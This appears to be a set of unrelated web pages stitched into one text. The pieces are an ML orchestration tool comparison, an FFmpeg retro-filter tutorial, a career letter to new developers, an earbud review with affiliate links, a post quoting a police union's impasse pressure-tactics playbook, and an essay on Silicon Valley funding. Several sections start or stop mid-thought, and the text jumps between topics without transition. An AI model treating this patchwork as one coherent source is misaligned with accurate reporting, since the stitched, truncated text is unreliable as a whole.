want to manage all of your tasks as pods, defining them in YAML instead of Python.</li><li><a href="https://www.kubeflow.org/"><strong>KubeFlow</strong></a><strong> </strong>if you want to use Kubernetes but still define your tasks with Python instead of YAML.</li><li><a href="https://mlflow.org/"><strong>MLFlow</strong></a> if you care more about tracking experiments or tracking and deploying models using MLFlow’s predefined patterns than about finding a tool that can adapt to your existing custom workflows.</li></ul><h2><strong>Comparison table</strong></h2><figure id="w-node-abe9bcb589cf-018ecc93"><p><img src="https://global-uploads.webflow.com/5d3ec351b1eba4332d213004/5f3d5fc9ba987f20a06c2e7f_4JEzgpYZM7va4Dj7GHftJaIskEjGSalpTOn70ASVq7GFe0z5hcmbukEUWM5XG8E_mQDKEYkzIa_uvuMdGrUC8gvp6qC5dquz3aulcBtsqdk9JSHh0PkqdmP4AoEWngwZ6bNQAEvm.png" alt=""></p><figcaption>For more Machine Learning Tips - <a href="https://www.datarevenue.com/signup">Get our weekly newsletter</a></figcaption></figure><p>For a quick overview, we’ve compared the libraries when it comes to:&nbsp;</p><ul role="list"><li><strong>Maturity: </strong>based on the age of the project and the number of fixes and commits;</li><li><strong>Popularity:</strong> based on adoption and GitHub stars;</li><li><strong>Simplicity: </strong>based on ease of onboarding and adoption;</li><li><strong>Breadth:</strong> based on how specialized vs. how adaptable each project is;</li><li><strong>Language: </strong>based on the primary way you interact with the tool.</li></ul><p>These are not rigorous or scientific benchmarks, but they’re intended to give you a quick overview of how the tools overlap and how they differ from each other. For more details, see the head-to-head comparison below.</p><h2><strong>Luigi vs. Airflow</strong></h2><p>Luigi and Airflow solve similar problems, but Luigi is far simpler. It’s contained in a single component, while Airflow has multiple modules which can be configured in different ways. Airflow has a larger community and some extra features, but a much steeper learning curve. Specifically, Airflow is far more powerful when it comes to scheduling, and it provides a calendar UI to help you set up when your tasks should run. With Luigi, you need to write more custom code to run tasks on a schedule.</p><p>Both tools use Python and DAGs to define tasks and dependencies. Use Luigi if you have a small team and need to get started quickly. Use Airflow if you have a larger team and can take an initial productivity hit in exchange for more power once you’ve gotten over the learning curve.</p><h2><strong>Luigi vs. Argo</strong></h2><p>Argo is built on top of <a href="https://www.datarevenue.com/ml-tools/kubernetes">Kubernetes</a>, and each task is run as a separate Kubernetes pod. This can be convenient if you’re already using Kubernetes for most of your infrastructure, but it will add complexity if you’re not. Luigi is a Python library and can be installed with Python package management tools, such as pip and conda. Argo is a <a href="https://kubernetes.io/docs/concepts/extend-kubernetes/api-extension/custom-resources/">Kubernetes extension</a> and is installed using Kubernetes. While both tools let you define your tasks as DAGs, with Luigi you’ll use Python to write these definitions, and with Argo you’ll use YAML.</p><p>Use Argo if you’re already invested in Kubernetes and know that all of your tasks will be pods. You should also consider it if the developers who’ll be writing the DAG definitions are more comfortable with YAML than Python. Use Luigi if you’re not running on Kubernetes and have Python expertise on the team.</p><h2><strong>Luigi vs. Kubeflow</strong></h2><p>Luigi is a Python-based library for general task orchestration, while Kubeflow is a Kubernetes-based tool specifically for machine learning workflows. Luigi is built to orchestrate general tasks, while Kubeflow has prebuilt patterns for experiment tracking, hyper-parameter optimization, and serving Jupyter notebooks. Kubeflow consists of two distinct components: Kubeflow and Kubeflow Pipelines. The latter is focused on model deployment and CI/CD, and it can be used independently of the main Kubeflow features.</p><p>Use Luigi if you need to orchestrate a variety of different tasks, from data cleaning through model deployment. Use Kubeflow if you already use Kubernetes and want to orchestrate common machine learning tasks such as experiment tracking and model training.</p><h2><strong>Luigi vs. MLFlow</strong></h2><p>Luigi is a general task orchestration system, while MLFlow is a more specialized tool to help manage and track your machine learning lifecycle and experiments. You can use Luigi to define general tasks and dependencies (such as training and deploying a model), but you can import MLFlow directly into your machine learning code and use its helper function to log information (such as the parameters you’re using) and artifacts (such as the trained models). You can also use MLFlow as a command-line tool to serve models built with common tools (such as scikit-learn) or deploy them to common platforms (such as AzureML or Amazon SageMaker).</p><h2><strong>Airflow vs. Argo</strong></h2><p>Argo and Airflow both allow you to define your tasks as DAGs, but in Airflow you do this with Python, while in Argo you use YAML. Argo runs each task as a Kubernetes pod, while Airflow lives within the Python ecosystem. Canva evaluated both options before settling on Argo, and you can <a href="https://www.youtube.com/watch?v=oXPgX7G_eow">watch this talk to get their detailed comparison and evaluation</a>.</p><p>Use Airflow if you want a more mature tool and don’t care about Kubernetes. Use Argo if you’re already invested in Kubernetes and want to run a wide variety of tasks written in different stacks.</p><h2><strong>Airflow vs. Kubeflow</strong></h2><p>Airflow is a generic task orchestration platform, while Kubeflow focuses specifically on machine learning tasks, such as experiment tracking. Both tools allow you to define tasks using Python, but Kubeflow runs tasks on Kubernetes. Kubeflow is split into Kubeflow and Kubeflow Pipelines: the latter component allows you to specify DAGs, but it’s more focused on deployment and model serving than on general tasks.</p><p>Use Airflow if you need a mature, broad ecosystem that can run a variety of different tasks. Use Kubeflow if you already use Kubernetes and want more out-of-the-box patterns for machine learning solutions.</p><h2><strong>Airflow vs. MLFlow</strong></h2><p>Airflow is a generic task orchestration platform, while MLFlow is specifically built to optimize the machine learning lifecycle. This means that MLFlow has the functionality to run and track experiments, and to train and deploy machine learning models, while Airflow has a broader range of use cases, and you could use it to run any set of tasks. Airflow is a set of components and plugins for managing and scheduling tasks. MLFlow is a Python library you can import into your existing machine learning code and a command-line tool you can use to train and deploy machine learning models written in scikit-learn to Amazon SageMaker or AzureML.</p><p>Use MLFlow if you want an opinionated, out-of-the-box way of managing your machine learning experiments and deployments. Use Airflow if you have more complicated requirements and want more control over how you manage your machine learning lifecycle.</p><h2><strong>Argo vs. Kubeflow</strong></h2><p>Parts of Kubeflow (like Kubeflow Pipelines) are built on top of Argo, but Argo is built to orchestrate any task, while Kubeflow focuses on those specific to machine learning – such as experiment tracking, …</p></div></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          
<p>I miss working with FFmpeg, so when I came across this <a href="https://www.gariany.com/2020/08/ffmpeg-step-by-step-retro-video-filter/(https://www.reddit.com/r/ffmpeg/comments/ibf0or/how_would_you_recreate_this_effect_with_ffmpeg/)">interesting challenge on Reddit</a>, I could not say no. I am currently looking for a new project as an Audio/Video software engineer or project manager and it was a nice break away from interviews. Are you currently hiring or have any interesting project proposals? <a href="https://www.gariany.com/contact">Get in touch with me!</a> 🌻</p>
<p>So, the challenge is to create a retro video filter using FFmpeg only for a given video. Here is my results:</p>

</video>


<h4 id="see-full-ffmpeg-code-bellow">See Full FFmpeg Code bellow</h4>
<p>Wofff… There is a lot to unpack here, but let's start with the assets. I remember seeing this amazing AI regenerative work recently done by <a href="https://www.youtube.com/channel/UCD8J_xbbBuGobmw_N5ga3MA">Denis Shiryaev</a> <a href="https://www.youtube.com/watch?v=VO_1AdYRGW8">San Francisco, a Trip down Market Street, April 14, 1906</a> based on the <a href="https://youtu.be/1Zmhr3ubG2E?t=194">original video</a>. Shout out to Denis, your work is remarkable!</p>
<p>I thought it will be fun to re-retro it. Also, it helps to compare with the original 1906 footage.</p>
<h3 id="step-1-masking-the-video">Step 1: Masking the Video:</h3>
<p>We start by creating a square to mask the video input to get that old round rectangle video feeling. I use <a href="https://imagemagick.org/index.php">ImageMagick</a> to compose the shape. I probably could have created this shape using an FFmpeg filter, but I was lazy and thought it will be useful to have a method to generally mask any video with any shape, even if this shape is a video file!</p>
<p>We start by creating the Round Rectangle we going to use to mask the video:</p>
<div><pre><code data-lang="bash"><span># generate square.png mask file</span>
convert -size 1000x1000 xc:transparent -fill green -stroke green -draw <span>"roundrectangle 0,0 1000,1000, 100,100"</span> square.png
</code></pre></div><p>Result:</p>

<video controls="" preload="auto" width="100%" autoplay="" loop="">
  
  
  
    <source src="https://www.gariany.com/2020/08/ffmpeg-step-by-step-retro-video-filter/masked_video.mp4" type="video/mp4" }}="">
    
  
  
</video>


<div><pre><code data-lang="bash"><span># mask input.mp4 with square.png input mask</span>

ffmpeg -y -f rawvideo -pix_fmt rgb32 -s 1920x1080 -i /dev/zero -r <span>30</span> -filter_complex <span>"movie='square.png'[sqr];[0:][sqr]overlay=(main_w-overlay_w)/2:(main_h-overlay_h)/2[canvas];[canvas]chromakey=0x008000:blend=0:similarity=0.15[canvas2];[0:][canvas2]overlay[canvas3];movie='input.mp4',scale=1920:1080[i1];[0:][i1]overlay[i2];[i2][canvas3]overlay[mix1];[0:][mix1]overlay[o]"</span> -map <span>"[o]"</span> -c:v libx264 -crf <span>31</span> -frames:v <span>300</span> masked_video.mp4
</code></pre></div><p>We start with an empty 1920x1080 canvas of pixels, setting “/dev/zero” as our data stream and RGB32 as our pixel format. I use this trick a lot so I can have full control over the overlays I'm about to draw on top. The only (and big) disadvantage is that “/dev/zero” is an endless stream of zeros, therefore we must limit the frames we are transcoding (using “-frames:v 30”).</p>
<p>Once we have the empty input, our ‘filter_complex’ chain starts with loading the “square.png” image and overlaying it in the center of the frame. We name this stream ‘canvas’. We then ‘punching a hole’ in it, using the ‘chromakey’ filter, with the color 0x008000 (or just green). We overlay this black frame with transparent round-square in the middle on top of the empty input and name this ‘canvas3’.</p>
<p>We load the input video ‘input.mp4’ and scaling it to our canvas. Notice, you probably want to calculate these beforehand as all of the scaling must be determined before running this command. The ‘[0:][i1]overlay[i2]’ filter is not really needed here, but we will use it to distort the video on the next part.</p>
<p>We then overlay the (no so much) distorted frame ‘i2’ and ‘canvas3’ (with the transparent hole in it) on top(!) and we name it ‘mix1’. Lastly, ‘[0:][mix1]overlay[o]’ is a simple copy and not really needed here, but will be used on the next part.</p>
<p>Again, this method should work with any green mask, including a video mask, which I find very cool for future artworks.</p>
<h3 id="step-2-retro-it-with-shaking-and-recoloring">Step 2: Retro it with Shaking and Recoloring:</h3>



















  
  
    
      
      
    
    
    
  



<video controls="" preload="auto" width="100%" autoplay="" loop="">
  
  
  
    <source src="https://www.gariany.com/2020/08/ffmpeg-step-by-step-retro-video-filter/distorted.mp4" type="video/mp4" }}="">
    
  
  
</video>


<div><pre><code data-lang="bash"><span># the input video distortion effect</span>

<span>[</span>0:<span>]</span><span>[</span>i1<span>]</span>overlay<span>=</span><span>'if(gt(random(0), 0.2), 1, 4)'</span>:<span>'if(gt(random(0), 0.1), 1, 2)'</span>,colorchannelmixer<span>=</span>.393:.769:.189:0:.349:.686:.168:0:.272:.534:.131<span>[</span>i2<span>]</span>
</code></pre></div><p>Remember our ‘[i2]’ video stream we skipped above? Let's make it shake a little with some overlay manipulation. On the X value, the “if” function will random a number between 0 and 1, if the number is bigger than 0.2 (20%), it will move the overlay by 4 pixels. I've included a couple of seconds at the end of the video to look at the video shaking on a ‘still’ image to break down the effect.</p>
<p>To recolor the video, we use “colorchannelmixer” filter and set the color channels values to something resembling a sepia tone. Funny, this is a manipulated AI colored video that for some reason looked older to me with these colors, at least more than a grayscale video.</p>

<p>So I went googling and found this video on YouTube (<a href="https://www.youtube.com/watch?v=9v9VVN1RE84">Damaged Old Film OVERLAY</a>), it was exactly what I was looking for.

		<p>Dear New Developer,</p>
<p>Congratulations! Let’s take a moment to celebrate the decision you’ve made to launch or redirect your career. What lies ahead is a lot of hard work, satisfaction, the occasional desire to throw your laptop out a window, and a ton of learning. That’s true of most professions, so you’re also in good company.</p>
<p>As a developer, you will solve a thousand puzzles, and then a thousand more. Your brain will stretch and grow. You will dream about databases or pixels or curly braces. I once had a dream where I was walking down a hallway, but the hallway <em>was my code</em>. It was a good dream. I found a bug.</p>
<p>Greg LeMond, a pro cyclist and three-time Tour de France winner, once said something about cycling that I want to share with you: <img data-attachment-id="6422" data-permalink="https://letterstoanewdeveloper.com/2020/04/27/it-never-gets-easier-you-just-go-faster/lemond/" data-orig-file="https://letterstoanewdeveloper.files.wordpress.com/2020/04/lemond.png" data-orig-size="355,239" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="lemond" data-image-description="" data-medium-file="https://letterstoanewdeveloper.files.wordpress.com/2020/04/lemond.png?w=300" data-large-file="https://letterstoanewdeveloper.files.wordpress.com/2020/04/lemond.png?w=355" src="https://letterstoanewdeveloper.files.wordpress.com/2020/04/lemond.png?w=1100" alt="lemond" srcset="https://letterstoanewdeveloper.files.wordpress.com/2020/04/lemond.png 355w, https://letterstoanewdeveloper.files.wordpress.com/2020/04/lemond.png?w=150 150w, https://letterstoanewdeveloper.files.wordpress.com/2020/04/lemond.png?w=300 300w" sizes="(max-width: 355px) 100vw, 355px"></p>
<p>“It never gets easier, you just go faster.”</p>
<p>In so many ways, that describes a career in software. The puzzles you struggle with today will be easy in a month or a year. You’ll learn new patterns and best practices. Then you’ll take on new, harder challenges. You’ll struggle with those and learn and grow. Then you’ll start the cycle (pun intended) all over again.</p>
<p>Something I’ll add, though, is that you’ll be able to approach later challenges with more experience and confidence. What we bring to our jobs is an accumulation of skills and experience. This isn’t linear. It sometimes goes smoothly, sometimes it’s faster than we imagine possible. Then there are stretches where it feels like we’re clambering around in the dark.</p>
<p>For instance, I was once asked to write a <a href="https://en.wikipedia.org/wiki/Wireless_Application_Protocol">WAP</a> application (think super early mobile apps before smart phones existed). I had absolutely no idea what I was doing and I was mostly left alone on the project. I started by drawing some screens, took a deep breath, and started building. It was really tough going, but so many lessons have stuck with me from that experience. My skills at breaking down challenges and approaching them bit by bit really improved. I became comfortable throwing away code because the first code I wrote was atrocious. Plus, the project was eventually canceled, which was entirely the right business decision. Through that, I learned about evaluating tradeoffs in terms of business value—my time was better spent on higher priority projects.</p>
<p>In my current adventure, nearly 20 years later, I’m once again writing a mobile app and applying all of those lessons. Picking up languages and frameworks that I haven’t used before is far less daunting. Ensuring that I’m working on the most important thing is a constant recalibration, but one that is comfortable now. Working through stumbling blocks one at a time and having patterns for getting through them is second nature.</p>
<p>Just like learning isn’t linear, neither are careers. Your path will be your own. What you are doing today may or may not be what you’re doing in ten years. You might go into any number of other areas in software, or stay the course as a developer. It’s your life and all those choices are equally valid. One of my former colleagues quit to make hand-built microphones; another makes goat cheese in the Catalan Pyrenees. My personal philosophy is that at each opportunity to make a career decision, you should pick the direction that interests you most. Just like you learn faster when you are interested in your subject, you will ship better software (or make better cheese) when you are interested in your job.</p>
<p>There’s much more I’d love to tell you, but this letter is growing long. I’ll add some concise tidbits before I end.</p>
<ul>
<li>You belong here. Try not to doubt that.</li>
<li>Get really good at debugging. It’s a skill and you will need it.</li>
<li>If you don’t respect your boss, or if they don’t respect you back, go find a new one.</li>
<li>Learning is part of your job. Make time for it.</li>
<li>Don’t be afraid to put your code in production.</li>
<li>Be a good team member. You will accomplish more and learn faster.</li>
<li>Ask lots of questions. Someone else probably wants to hear the answer.</li>
<li>And finally, have fun! You’ve got this!</li>
</ul>
<p>I wish you all the luck in the world!</p>
<p>Sincerely,<br>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>I was usually skeptical about spending little money on audio accessories, but when saw these pair of <a href="https://amzn.to/2YobSAO">Bluetooth wireless earbuds by Aukey for 25 dollars</a>, I decided to order them just to see how far the audio technology has gone at the affordable price range. Considering the price I wasn’t expecting much of them until I got them. Boy, I couldn’t believe how much they packed at the decent quality for that price.</p>
<p>Normally in my workouts, I would use the good old <a href="https://amzn.to/3l4JoGa">Apple EarPods with cable</a>, because I’d never had to think about charging them or losing them, just stick them in my ears and I’m ready to go. But these pair of Aukey changed that, and for the same price of Apple EarPods.</p>
<p>The battery could last for 8-10 hours, which means for at least 8 workouts until the next full charge. To fully charge the battery it takes around an hour and a half, which is acceptable. Not only I was happy with the battery life but also with the sound quality, it’s not the audiophile-level but it’s pretty decent considering the price. Other than that it includes a built-in mic, IPX4 splash-proof resistance, Bluetooth 4.1, 3 pairs of ear-tips and ear-hooks at different sizes for your ear, carrying pouch, and a USB cable.</p>
<p>Honestly, they really took me on surprise. If you are interested I wrote a full review on these earbuds on <a href="https://devandgear.com/posts/review-sport-wireless-bluetooth-earbuds-by-aukey/">Dev&amp;Gear</a>, you might wanna check it out.
All-around I highly recommend them for anyone who wants to have a decent pair of earbuds without spending too much.</p>

<p><em><strong>For paranoia, sheer cynicism and demonstration of unbridled self-interest there’s nothing that can beat this “playbook” created by the law firm of Lackie, Dammeier &amp; McGill for use by their clients: cop unions.</strong></em></p>
<p><em><strong>See how many of these tactics strike you as familiar in Fullerton. Paranoia, cynicism and self-interest. Check, check, check.</strong></em></p>

<p><strong>Lackie, Dammeier &amp; McGill</strong><br>
Former Cops Defending Current Ones</p>
<p><strong>Negotiations After Impasse –&nbsp;Association Options</strong><br>
In gearing up for negotiations, hopefully your association has developed some political ties with members of your governing body. Now is the time those political endorsements, favors, and friendships come into play. When negotiations reach an impasse, the association will have options which may be utilized simultaneously, or one before the other.</p>
<p><strong>Political Option</strong><br>
As most association leaders already know, associations should be selective in their battles. However, this does not mean that the association should roll over for everything either. Association respect (by the employer) is gained over years of actions or inactions. Associations who rarely, if ever, take things to the mat or challenge the employer gain little respect at the bargaining table or elsewhere. The flip side is also true. Those associations that battle over every minor issue may be seen as an association that simply cannot be pleased, so why bother. While it is a fine line, somewhere in the middle is where you want to be. The association should be like a quiet giant in the position of, “do as I ask and don’t piss me off.” Depending on the circumstances surrounding the negotiations impasse, there are various <strong>tools</strong> available to an association to put political pressure on the decision makers. A few things to keep in mind when utilizing these tools are the following:</p>
<p><strong>Public Message</strong><br>
Always keep this in mind. The public could care less about your pay, medical coverage and pension plan. All they want to know is “what is in it for them.” Any public positions or statements by the association should always keep that focus. The message should always be public safety first. You do not want wage increases for yourselves, but simply to attract better qualified candidates and to keep more experienced officers from leaving.</p>
<p><strong>The Future</strong><br>
Also keep in mind that once the fight is over, you and your members will still be working there. Avoid activities where one or just a few members are involved who can be singled out for retaliation. Always keep in mind your department policies and the law. You should be in very close contact with your association’s attorney during these times to ensure you are not going to get yourself or any of your members in trouble. For associations in the Legal Defense Fund, please keep in mind that concerted labor activity should always be discussed with the LDF Trustees prior to the activity to ensure coverage.</p>
<p><strong>Let the Debate Begin</strong><br>
Again, the ideas listed below are not in any particular order. Just as in your use-of-force guidelines, you can start with simple verbal commands or jump to a higher level, based on the circumstances.<br>
Keep in mind that most of these <strong>tools</strong> are not to deliver your message to the public but are designed to simply get the decision makers into giving in to your position.</p>
<ul>
<li><strong>Storm City Council</strong> – While an association is at impasse, no city council or governing board meeting should take place where members of your association and the public aren’t present publicly chastising them for their lack of concern for public safety.</li>
<li><strong>Picketing –</strong> Plan a few well organized picketing events. Keep these events spread out to avoid burning out your membership.</li>
<li><strong>Public Appearances</strong> – During impasse, the association should make known at every significant public event, such as parades, Christmas tree lightings, the Mayor’s Gala and any other event of interest to the decision makers, that the association is upset about the lack of concern for public safety.</li>
<li><strong>Newspaper Ads –</strong> Again, keep the message focused on “public safety.”</li>
<li><strong>Billboards</strong> – Nothing seems to get more attention than a billboard entering the city limits which reads that crime is up and the City could care less about your safety.</li>
<li><strong>Websites</strong> – <a href="http://gardengrovesucks.com/" rel="nofollow" target="_blank">GardenGroveSucks.com</a> was a big hit.</li>
<li><strong>Job Fair</strong> – Getting your members to apply at a large local agency, which causes an influx of personnel file checks by background investigators always sends a strong signal. Keep this for last, as some of your members may ultimately leave anyway.</li>
<li><strong>Work Slowdown</strong> – This involves informing your members to comply closely with Department policy and obey all speed limits. It also involves having members do thorough investigations, such as canvassing the entire neighborhood when taking a 459 report and asking for a back-up unit on most calls. Of course, exercising officer discretion in not issuing citations and making arrests is also encouraged.</li>
<li><strong>Blue Flu</strong> – This one is very rarely used and only in dire circumstances. As with all of these, please consult your association’s attorney before even discussing this issue with your members.</li>
<li><strong>Public Ridicule</strong> – Blunders by the City Manager, Mayor, or City Council members or wasteful spending should be highlighted and pointed out to the public at every opportunity.</li>
<li><strong>Referendum / Ballot Initiatives</strong> – Getting the public to vote for a wage increase is seldom going to fly, however, as a pressure tactic, seeking petition to file a referendum on eliminating the City Manager’s position for a full time elected mayor may cause the City Manager to rethink his or her position.</li>
<li><strong>Mailers</strong> – Again, the message should be for “public safety” in getting the public to attend city council meetings and to call the City Council members (preferably at home) to chastize them for their inaction.</li>
<li><strong>Campaigning</strong> – If any members of the governing body are up for election, the association should begin actively campaigning against them, again for their lack of concern over public safety. If you are in a non-election year, make political flyers which you can explain will be mailed out the following year during the election season.</li>
<li><strong>Focus on an Individual</strong> – Avoid spreading your energy. Focus on a city manager, councilperson, mayor or police chief and keep the pressure up until that person assures you his loyalty and then move on to the next victim.</li>
<li><strong>Press Conferences</strong> – Every high profile crime that takes place should result in the association’s uproar at the governing body for not having enough officers on the street, which could have avoided the incident.</li>
</ul>
<p>Of course, other ideas that cops come up with are very imaginative. Just keep in mind, the idea is to show the decision makers that the public favors public safety and it will only harm their public support by not prioritizing you and almost equally as important, to let them know that next time they should agree with you much sooner.</p>

<p>If you haven’t seen it in the news: it’s basically a giant tube that you sit inside of while you’re propelled hundreds of miles an hour to your destination. It’s sort of like the tube you put your checks in at the bank drive-thru… but instead of checks, it’s people.</p>
<p>It’s really cool, and it could easily disrupt airline and rail travel as we know it.</p>

<h3>A SIMPLE QUESTION</h3>
<p>As an entrepreneur, I began to wonder, “Why hasn’t anyone proposed this already?” It’s a great idea, but… Elon Musk can’t be the first person to think of it.</p>
<p>In doing some research online I found out that other American inventors have had <a title="Did Musk steal the idea for Hyperloop?" href="http://www.fastcoexist.com/3015704/futurist-forum/how-much-did-this-hyperloop-lookalike-inspire-elon-musk" target="_blank" rel="noopener" shape="rect">similar designs and proposals</a> for a decade. <b>However, none of them were able to get taken seriously or obtain funding.</b></p>
<p>Why did that happen?</p>
<p>I want to tell you my answer.</p>

<h3>MY THESIS</h3>
<p>My thesis is simple. We haven’t seen Silicon Valley develop a company like Hyperloop — even though the plans have been out there for over a decade — because there’s a systemic failure in the startup ecosystem. In short,&nbsp;<strong>Silicon Valley has killed major innovation.</strong></p>

<p>HAS THE VALLEY BECOME A BUNCH OF SHEEP?</p>
</div>
<p>In all of the hype around companies like Facebook and Instagram — what really are just glorified websites — we’ve lost sight of some real innovation opportunities, most of which occur in the offline world.</p>
<p><strong>The entire culture of Silicon Valley, and entrepreneurship around the globe, has taken on a groupthink</strong> that prevents truly novel inventions, like the Hyperloop, from reaching the market.</p>
<p>The result is a major loss. It’s a loss to our society. It’s a loss to our capital markets. It’s a loss to private investors. And it’s a loss to entrepreneurs.</p>

<h3>THIS IS A REALLY IMPORTANT QUESTION</h3>
<p>The title of this article is, “Why silicon valley funds Instagrams, not Hyperloops.” Note the plural. I’m not necessarily talking about Instagram in particular, or the Hyperloop in particular.</p>
<p>No, I’m asking a question: <strong>Why are we funding these really silly internet companies and not major life changing innovations?</strong> Why is it that all of my peers are inventing little dinky iPhone apps instead of planes, trains, and automobiles?</p>
<p>I feel like this is a really important question. Because, if as a country, America is going to continue to lead in innovation, we can’t be spending our time developing toys. <strong>We have to innovate innovation itself.&nbsp;</strong>In fact, I’m actually not the first person to bring this up. There are a lot of thinkers surrounding the entrepreneurial space who have been asking this same question: Why are so many startups today creating such meaningless products?</p>
<p><strong>I’m going to present nine theories as to why we’re funding Instagrams but not Hyperloops.</strong>&nbsp;By no means is this an exhaustive list. It’s just a place to start a conversation. Here we go:</p>

<h3>THEORY 1: THE IPO MARKET SUCKS</h3>
<p>We have an undesirable IPO market right now. It’s a bad time to take a company public.</p>
<p>A company like Hyperloop is too large to be an M&amp;A exit. It’s an IPO exit. So if you are going to make the Hyperloop, an investor’s going to ask, “How are we going to exit this investment?” The answer is, “An IPO.” And, right there, a lot of investors lose interest. To many, it would seem that making the Hyperloop might be easier than having a successful IPO!</p>
<p>In parallel commentary to this, please read Mark Cuban’s <a title="Mark Cuban's Stock Market blog post" href="http://blogmaverick.com/2010/08/20/the-stock-market-is-still-for-suckers-and-why-you-should-put-your-money-in-the-bank/" target="_blank" rel="noopener" shape="rect">post on the stock market</a>. It really got me thinking:</p>

<p>THE STOCK MARKET, CA. 1940</p>
</div>
<p><strong>The stock market used to be a place where entrepreneurs went and raised money for their companies.</strong> That’s what the stock market used to be. Today the stock market is a place where hedge fund managers and quant traders are shaving fractions of a penny off benign movements in price and volume. One of the byproducts of going from an entrepreneurial stock market to a hyper-traded stock market is that new companies can’t survive unless they have a market cap of at least $10 billion dollars. Don’t even bother going public with less than that. It’s not worth the time, or the money, or the effort.</p>
<p><strong>Furthermore, the stock market isn’t influenced by value today like it was thirty years ago.</strong> Whenever I bring this conversation up, I always ask people, “If AOL comes out with a phenomenal new product, is the stock price guaranteed to go up?” No, of course not. “If Kaiser Permanente releases a drug that cures all cancers, is the stock price guaranteed to go up?” No, of course not. The stock price goes up or down based on supply and demand. It only responds to human action. And, therefore, the price of a stock is solely determined by how people <i>think</i> about the price of a stock. There’s nothing that forces a company’s actual business value to drive the ticker price.</p>
<p>So when an investor says, “I don’t like investing in companies that have an IPO track,” he’s not crazy. It’s actually a very reasonable thing today — as a investor or an entrepreneur — to say, “I want to make a company that’s going to get acquired.” That’s really the most intelligent and reasonable strategy.</p>

<p>THE STOCK MARKET, CA. 2010</p>
</div>
<p><strong>But without a public equities market to which investors can exit early-stage investments, and where retail investors can buy stock in new companies that will continue to grow, inventions like the Hyperloop can’t go public.</strong> And if it can’t go public, it’s not exiting; and if it’s not exiting, no one is going to invest. Under these circumstances, the only way that the Hyperloop is ever developed is if someone like Elon Musk has enough capital of his own to finance it.</p>
<p>And that’s really a shame for America. We really need to look into that. We need to figure out how we’re going to make the IPO market better, because if we want to have innovative products, we have to repair the process of going public and make it appealing again. Right now, the only sane choice is to aim for an acquisition. But mergers and acquisitions are on average $100 million a piece. There’s no way to have a company as large as Hyperloop acquired because it’s a multi billion-dollar company. You just can’t do it. So, how are you going to exit? You can’t. And that’s one reason why it won’t get funded.</p>

<h3>THEORY 2: CONTEMPORARY PORTFOLIO STRATEGY FAVORS LAYUPS AND DISCOURAGES 3-POINTERS</h3>
<p><a href="https://i0.wp.com/roddmartin.wpengine.com/wp-content/uploads/2015/09/f3f6b8eb-8ce0-450b-a182-11e14ca7b183.png"><img data-attachment-id="55643" data-permalink="https://rodmartin.org/why-silicon-valley-funds-instagrams-not-hyperloops/f3f6b8eb-8ce0-450b-a182-11e14ca7b183/" data-orig-file="https://i1.wp.com/rodmartin.org/wp-content/uploads/2015/09/f3f6b8eb-8ce0-450b-a182-11e14ca7b183.png?fit=300%2C199&amp;ssl=1" data-orig-size="300,199" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="f3f6b8eb-8ce0-450b-a182-11e14ca7b183" data-image-description="" data-medium-file="https://i1.wp.com/rodmartin.org/wp-content/uploads/2015/09/f3f6b8eb-8ce0-450b-a182-11e14ca7b183.png?fit=300%2C199&amp;ssl=1" data-large-file="https://i1.wp.com/rodmartin.org/wp-content/uploads/2015/09/f3f6b8eb-8ce0-450b-a182-11e14ca7b183.png?fit=300%2C199&amp;ssl=1" src="https://i1.wp.com/roddmartin.wpengine.com/wp-content/uploads/2015/09/f3f6b8eb-8ce0-450b-a182-11e14ca7b183-300x199.png?resize=300%2C199" alt="f3f6b8eb-8ce0-450b-a182-11e14ca7b183" width="300" height="199" data-recalc-dims="1"></a></p>
<p>TRY TO HIT AS MANY STARTUPS AS POSSIBLE</p>
<p>There is a portfolio strategy in place by investors and incubators that promotes a shotgun approach as opposed to a sniper rifle approach. What does this mean? It means that early stage funds, super angels, and micro VC’s are primarily interested in investing $50,000 a piece in hundreds of different startups instead of investing $4,000,000 a piece in a select few. The shotgun portfolio strategy speculates that a few startups will be successful, and will pay for all of the losers. When the smoke clears, there’s some cream on top, and that’s your investment return.</p>
<p><strong>This isn’t always how it used to be. From the early days of venture capital through the 90’s, there was a sniper rifle approach.</strong>Investors were more thoughtful, plotting. They picked a couple winners that they really believed in.</p>
<p>But in the same way that our nation’s politics is driven by a belief system, so is our leading investment strategy. And the prime belief behind the shotgun approach is that, “You can’t pick winners. Picking winners is a fool’s errand.” And, therefore, the only sane approach is to weed out the losers and invest in as many potential winners as possible. Incubators like Y-Combinator and Dream It have perfected this approach.</p>
<p>I’m not saying it’s necessarily a bad approach.<strong>But I want to point out the sniper rifle approach also works.</strong> It got us companies like HP, Kentucky Fried Chicken, and Hyundai.</p>

<p>TRY TO HIT AS FEW STARTUPS AS POSSIBLE</p>
</div>
<p>Why does this matter for our discussion about Hyperloop? A shotgun approach is predicated on a lot of small investments by angels. Instead of an angel writing a $5 million check, an angel writes a $50,000 check. Well, a company like Hyperloop is going to take a first round from angels of at least $20 million just to produce a limited engineering proof-of-concept. <strong>If angels are investing on a shotgun approach, the size of the check isn’t there, plain and simple.</strong> A company like Hyperloop is too big — because when you’re investing with a shotgun method, you don’t want to get involved in big companies. You want to get involved in companies where $50,000 gets you pretty far. And those tend to be companies where the product is code. So for any investor that has a shotgun portfolio strategy, which is most, Hyperloop would be a horrible investment — totally outside of your investment parameters.</p>
